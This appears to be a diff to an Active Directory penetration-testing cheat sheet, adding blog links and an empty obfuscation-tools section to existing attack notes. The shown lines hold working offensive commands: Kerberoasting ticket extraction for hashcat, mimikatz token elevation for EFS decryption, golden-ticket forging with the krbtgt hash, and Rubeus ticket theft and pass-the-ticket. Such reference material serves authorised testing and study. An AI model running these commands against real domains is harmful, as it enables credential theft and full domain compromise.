@@ -934,7 +934,12 @@ JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL
 Kerberoasting
 
 ```powershell
-Get-DomainSPNTicket -Credential $
+#Check my Blog Post Kerberos Attacks in Depth for Further Information
+#https://m0chan.github.io/Kerberos-Attacks-In-Depth
+
+Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat
+
+because Hashcat over John anyday right?
 
 Invoke-Kerberoast.ps1
 
@@ -1152,7 +1157,7 @@ Decrypt EFS Files with Mimikatz if Admin/System
 ```powershell
 #https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 
-cipher /c "d:\Users\Gentil Kiwi\Documents\encrypted.txt" - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.
+cipher /c "d:\Users\Gentil Kiwi\Documents\m0chan.txt" - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.
 
 privilege::debug 
 token::elevate 
@@ -1194,6 +1199,9 @@ C:\Windows\SysWOW64\SystemPropertiesRemote.exe
 Golden Ticket Attack
 
 ```powershell
+#Check my Blog Post Kerberos Attacks in Depth for Further Information
+#https://m0chan.github.io/Kerberos-Attacks-In-Depth
+
 # To generate the TGT with NTLM
 mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
 
@@ -1366,6 +1374,9 @@ Enter-PSSession $Session
 Pass-The-Ticket
 
 ```powershell
+#Check my Blog Post Kerberos Attacks in Depth for Further Information
+#https://m0chan.github.io/Kerberos-Attacks-In-Depth
+
 Rebeus monitor /interval:30 
 
 Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets
@@ -1375,5 +1386,33 @@ Reubus will now give you a Kerberos ticket in base64 which you can pass with
 Rubeus.exe ptt /ticket:[base64blobhere]
 
 We can now request TGS service tickets to access network resources as this user
+```
+
+
+
+## [](#header-2)Obfuscation Techniques 
+
+
+
+Invoke-Obfusaction
+
+```powershell.exe
+
+```
+
+
+
+Invoke-CradleCraft
+
+```
+
+```
+
+
+
+Invoke-DOSfuscation
+
+```
+
 ```
 
